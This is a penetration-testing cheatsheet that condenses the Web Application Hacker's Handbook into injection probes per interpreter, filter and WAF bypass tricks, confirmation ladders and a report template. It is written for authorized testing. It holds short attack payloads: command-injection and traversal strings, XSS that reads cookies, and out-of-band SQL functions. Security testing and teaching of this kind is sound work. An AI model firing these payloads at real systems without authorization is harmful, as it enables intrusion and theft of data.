# Cheatsheet — Web Application Hacker's Handbook

Quick-lookup card. Mechanics in `chapters/`; mindset in `SKILL.md`; terms in `glossary.md`. Authorized, in-scope testing only — minimal PoCs, throttled volume, test accounts.

**Edition (2011):** mechanics durable; tool/platform specifics era-marked —
see per-chapter edition notes + `sources.md` for modern routing.

## Assessment loop

1. Map everything: walkthrough per privilege level + spider + hidden content + public sources.
2. Catalog entry points: all params, headers, cookies, uploads, OOB channels, serialized blobs.
3. Fingerprint → default content paths + likely bug classes.
4. Per area: run that chapter's full checklist — coverage is the methodology.
5. Two-account diffs on all object/privilege flows; escalate via chains; minimal PoC each.

## Per-boundary metachar map

| Interpreter | Probes | Confirm |
|---|---|---|
| SQL | `' " \` \` ` \` | `OR 1=1` vs `AND 1=2`; `SLEEP(5)`/`WAITFOR`/`pg_sleep`; UNION col count → `version()` |
| NoSQL (Mongo) | `[$ne]`, `{"$gt":""}`, `$where` | auth bypass; boolean content delta |
| XPath | `' or '1'='1`, `']\|//*\|/*['` | node dump / auth bypass |
| LDAP | `*`, `*)(uid=*))(\|(uid=*` | filter bypass / attribute dump |
| OS shell | `; \| & && \|\| \n $( ) \` ` | repeated timing delay; OOB DNS/HTTP hit |
| Filesystem | `../`, `..\\`, `..;/`, `%2e%2e%2f`, `%252e`, `....//`, `%00.jpg` | file contents / source in response |
| XML/SOAP | `<!ENTITY`, element/param injection, WSDL recon | entity file read; extra backend param accepted |
| Headers | `%0d%0aSet-Cookie:`, `%0aCc:` | injected header/cookie/mail field |
| JS/DOM | `</script>`, `';alert(1)//`, `javascript:` | alert fires / sink write |
| Native | length at 2^k boundaries, `0x7fffffff`, `-1`, `%x%x%x%n` | crash / stack leak in response |

## Defense-bypass quick ref (by mechanism)

- **Blacklist/regex**: case mix · nested `<scr<script>ipt>` / `SELSELECTECT` · NULL byte `%00` · alternate tags/funcs · encodings (URL, double-URL `%25`, HTML entities `&#x6c;`/dec/no-semicolon).
- **Decode-order**: `%253c` double-encode · Unicode lookalikes (e.g. `«`→`<`) · multibyte lead byte (`%f0` eats following quote in Shift-JIS/EUC-JP/BIG5).
- **Escaping**: escape the escape `foo\;ls` · odd quotes after truncation (pad 127 `a`s + `'`) · `</script><script>` when JS-string escaped · `&apos;` inside event handlers.
- **Length limits**: `open("//a/"+document.cookie)` · span payload across fields with `/*…*/` · `eval(location.hash.slice(1))` DOM-conversion.
- **Param handling**: delete param (name too) · duplicate param (HPP — first/last/all per layer) · add unadvertised params (`admin`, `debug`, `role`) · `&`-injection into back-end request (HPI).
- **Workflow**: skip/reorder/replay stages · stage-N params at stage-M · other role's params · accumulate state then switch feature.
- **Numeric limits**: `-1`, `0`, `0x7fffffff`, limit±1, negatives, decimals.
- **CSRF tokens**: drop param · substitute own token · method/content-type swap · check Referer-absent path.
- **Access controls**: replay A→B · forced browse admin URLs · cycle IDs · method swap · `X-Forwarded-For` spoof · static file direct hit · `Host`/vhost tricks.
- **Session**: decode token structure · series-diff for sequences/timing · fixation (token kept post-login?) · cookie scope (domain/path/flags).
- **WAF**: encodings it misses · NULL byte truncates native match · uninspected channel (body/multipart/method) · split payload across params.

## Injection confirmation ladders

- **SQL**: error → boolean (`1=1`/`1=2`) → time → UNION `version()` → schema (`information_schema`, `sqlite_master`, `all_tables`, `sysobjects`) → OOB (`UTL_HTTP`, `xp_dirtree`, `LOAD_FILE`).
- **Command injection**: metachar probe → `;sleep 5` timing ×3 → output redirect to webroot → OOB listener.
- **Traversal**: variant set → `/etc/passwd`/`win.ini` → app config/source → write-probe harmless file.
- **XSS**: `myxsstest` marker → context → minimal payload → real-browser verify → impact PoC (cookie read on test account).
- **SMTP**: `%0aCc:you@x`/`%0d%0aBcc:you@x` → check your mailbox → then full `DATA` sequence test.

## Automation recipe

1. Baseline: capture known-invalid response completely.
2. Hit signals: status, length, Location, Set-Cookie, body markers, timing, side effects.
3. Loop handles: re-login, nonce/CSRF refresh, sequence requirements, throttle, pause-on-lockout.
4. Log every response; sort by each signal axis post-run. Resume-capable.

## Report skeleton

`[class] via [mechanism] at [endpoint/param] → [business impact]` → affected surface → repro steps → minimal-PoC evidence → mechanism-level remediation (parameterize, boundary-validate, scope state) → coverage notes.

## When stuck

- Change representation: encoding, method, content-type, param position, duplicates.
- Change boundary: same input into a different interpreter (2nd-order, stored, OOB).
- Change account/privilege; change stage; change order.
- Provoke errors at each layer — new info = new hypothesis.
- Read client JS/source for unadvertised params and endpoints.
